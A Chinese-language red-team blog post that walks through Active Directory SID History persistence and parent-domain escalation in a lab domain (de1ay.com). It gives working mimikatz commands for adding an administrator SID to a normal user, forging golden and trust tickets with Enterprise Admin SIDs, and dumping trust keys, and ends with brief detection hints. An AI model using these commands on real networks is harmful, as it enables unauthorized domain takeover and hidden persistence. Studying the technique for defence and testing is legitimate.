---
layout:     post
title:    域渗透-SID History权限维持及域信任攻击
subtitle:  SID History权限维持及域信任攻击
date:       2021-02-17
author:     hmoytx
header-img: img/bg_02.jpg
catalog: true
tags:
    - 域渗透
    - 红队
    - 内网渗透
---
# 域渗透-SID History权限维持及域信任攻击

## SID介绍
每个用户帐号都有一个对应的安全标识符（Security Identifiers，SID），SID用于跟踪主体在访问资源时的权限。如果存在两个同样SID的用户，这两个帐户将被鉴别为同一个帐户，原理上如果帐户无限制增加的时候，会产生同样的SID，在通常的情况下SID是唯一的，他由计算机名、当前时间、当前用户态线程的CPU耗费时间的总和三个参数决定以保证它的唯一性。  
为了支持AD牵移，微软设计了SID History属性，SID History允许另一个帐户的访问被有效的克隆到另一个帐户。  
一个完整的SID包括：  
- 用户和组的安全描述  
- 48-bit的ID authority  
- 修订版本  
- 可变的验证值Variable sub-authority values  

例：S-1-5-21-310440588-250036847-580389505-500  
第一项S表示该字符串是SID；第二项是SID的版本号，对于2000来说，这个就是1；然后是标志符的颁发机构（identifier authority），对于2000内的帐户，颁发机构就是NT，值是5。然后表示一系列的子颁发机构，前面几项是标志域的，最后一个标志着域内的帐户和组。    
可以注意到最后一个标志位为500，这个500是相对标识符（Relative Identifer, RID），账户的RID值是固定的。一般克隆用户原理就是篡改其他用户的RID值使系统认为对应用户是管理员。  
常见的RID：500-管理员  519-EA  501-Guest  

## SID History利用前提
1.域间存在信任关系。  
2.开启SID History信任。  

默认情况下新域添加到域树或林根域中，创建的是双向传递信任。  


## 测试环境
10.10.10.10  DC.de1ay.com  
10.10.10.11  subdc.sub.de1ay.com  
10.10.10.201 pc.sub.de1ay.com  


## SID History单一域内利用
SID History工作在单一域内时，域中的普通帐户可以包含SID，若这个SID是一个特权帐户或组，那就可以在不作为域管组成员的情况下授予普通用户域管权限，相当于一个域权限维持后门。  

假定现在有一个普通权限的域成员testc，域为sub.de1ay.com。  
没有操作前是无法访问域控盘符。  
![1](/img/210217_refuse.png)   
通过mimikatz执行命令：  
```
privilege::debug
sid::patch
sid::add /sam:testc /new:domain sid -500  # RID 500 域管理员 
sid::add /sam:testc /new:administrator    #  这样也行
```   
可以看到sIDHitory中多了一条。  
![2](/img/210217_sid.png)   
此时再访问域控。  
![3](/img/210217_success.png)   
最后可以通过`mimikatz "sid::clear /sam:testc" exit`清除。   

## SID History在域树中的利用
对于同一个域树中的父子域来说，如果能获得子域中的高权限用户，就可以将该用户的SID赋予EA权限（519），这样对于父域也是高权限用户。假设我们已经拿下子域sub.de1ay.com的域控权限，即可以利用该方法在父域提权。需要的前提信息：
- 子域的Krbtgt Hash 和 域SID  
- 父域的SID  
对比下黄金票据的条件：  
```
mimikatz "kerberos::golden /domain:<domain> /sid:<SID> /krbtgt:krbtgt ntlm hash /user:<username> /ptt" exit  
```    
只多了一个父域的SID，即sids。  
先在子域的域控权限下获取krbtgt的NTLM hash。  
![4](/img/210217_krbtgt.png)    
然后在子域内的机器（pc.sub.de1ay.com）上运行mimikatz:  
```
mimikatz "kerberos::golden /domain:<domain> /sid:<current SID> /sids:<target domain SID>-519 /krbtgt:krbtgt ntlm hash /user:<username> /ptt" exit  
```
可以发现已经有权限访问父域控相关内容。  
![5](/img/210217_dirdc.png)    


## 域信任攻击父域
还是用的上面的环境。  
查看域信任关系：  
```
nltest /domain_trusts  
```  
![6](/img/210217_domaintrust.png)  

使用mimikatz在域控制器中导出并伪造信任密钥，请求访问目标域中目标服务的TGS票据,创建具有sIDHistory的票据，对目标域进行安全测试。  
在subdc.sub.de1ay.com中使用mimikatz获取需要的信息:  
```
mimikatz.exe privilege::debug "lsadump::trust /patch" exit
```
获取其中的域信任密钥及两个SID（当前域及目标域）。  
![7](/img/210217_rc4.png)  
获取上述信息后，在子域内的机器（pc.sub.de1ay.com）中使用普通用户（sub\testc）权限执行如下命令创建信任票据。  
```
mimikatz "kerberos::golden /domain:<current domain (sub.de1ay.com)> /sid:<current SID> /sids:<target domain SID>-519 /rc4:<rc4_hmac_nt> /user:<username> /service:krbtgt /target:<target domain (de1ay.com)>  /ticket:de1ay.kirbi" exit
```  
![8](/img/210217_kirbi.png)   
然后尝试用rubeus来获取票据，发现失败了。  
![9](/img/210217_rubeus.png)   
最后换回了老工具。  
![10](/img/210217_asktgs.png)   
最后将生成的票据注入进内存，就可以了。  
![11](/img/210217_klist.png)   

## 总结
针对SID History攻击防范还是比较容易的，特征比较明显（sidHistory属性），还有日志中的4765 4766事件。  
针对根域攻击的方式还有委派，这里先鸽着，想起来了再补充


## 参考
[http://t3ngyu.leanote.com/post/7697c6e55644](http://t3ngyu.leanote.com/post/7697c6e55644)    
[https://www.cnblogs.com/mq0036/p/3518542.html](https://www.cnblogs.com/mq0036/p/3518542.html)  
[https://www.cnblogs.com/micr067/p/12984136.html](https://www.cnblogs.com/micr067/p/12984136.html)    
[https://github.com/NotScortator/asktgs_compiled](https://github.com/NotScortator/asktgs_compiled)   


